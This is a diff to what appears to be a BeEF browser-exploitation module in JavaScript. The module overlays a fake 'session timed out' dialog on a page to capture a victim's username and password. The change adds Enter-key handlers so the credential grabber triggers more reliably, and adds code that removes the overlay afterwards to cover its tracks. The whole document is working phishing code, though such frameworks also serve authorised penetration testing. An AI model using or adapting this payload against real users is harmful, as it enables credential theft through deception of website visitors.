@@ -95,6 +95,8 @@ beef.execute(function() {
 			// lighten screen
 			grayOut(false);
 			clearInterval(credgrabber);
+			$j('#hax').remove();
+			$j('#darkenScreenObject').remove();
 		}
 	}
 
@@ -106,7 +108,7 @@ beef.execute(function() {
 		sneakydiv.setAttribute('style', 'width:400px;height:320px;position:absolute; top:30%; left:40%; z-index:51; background-color:ffffff;font-family:\'Arial\',Arial,sans-serif;border-width:thin;border-style:solid;border-color:#000000');
 		sneakydiv.setAttribute('align', 'center');
 		document.body.appendChild(sneakydiv);
-		sneakydiv.innerHTML= '<br><img src=\''+imgr+'\' width=\'80px\' height\'80px\' /><h2>Your session has timed out!</h2><p>For your security, your session has been timed out. To continue browsing this site, please re-enter your username and password below.</p><table border=\'0\'><tr><td>Username:</td><td><input type=\'text\' name=\'uname\' id=\'uname\' value=\'\'></input></td></td><tr><td>Password:</td><td><input type=\'password\' name=\'pass\' id=\'pass\' value=\'\'></input></td></tr></table><br><input type=\'button\' name=\'lul\' id=\'lul\' onClick=\'document.getElementById(\"lul\").value=\"Processing..\";\' value=\'Continue\'>';
+		sneakydiv.innerHTML= '<br><img src=\''+imgr+'\' width=\'80px\' height\'80px\' /><h2>Your session has timed out!</h2><p>For your security, your session has been timed out. To continue browsing this site, please re-enter your username and password below.</p><table border=\'0\'><tr><td>Username:</td><td><input type=\'text\' name=\'uname\' id=\'uname\' value=\'\' onkeydown=\'if (event.keyCode == 13) document.getElementById(\"lul\").value=\"Processing..\";\'></input></td></td><tr><td>Password:</td><td><input type=\'password\' name=\'pass\' id=\'pass\' value=\'\' onkeydown=\'if (event.keyCode == 13) document.getElementById(\"lul\").value=\"Processing..\";\'></input></td></tr></table><br><input type=\'button\' name=\'lul\' id=\'lul\' onClick=\'document.getElementById(\"lul\").value=\"Processing..\";\' value=\'Continue\'>';
 		credgrabber = setInterval(checker,1000);
 
 	}
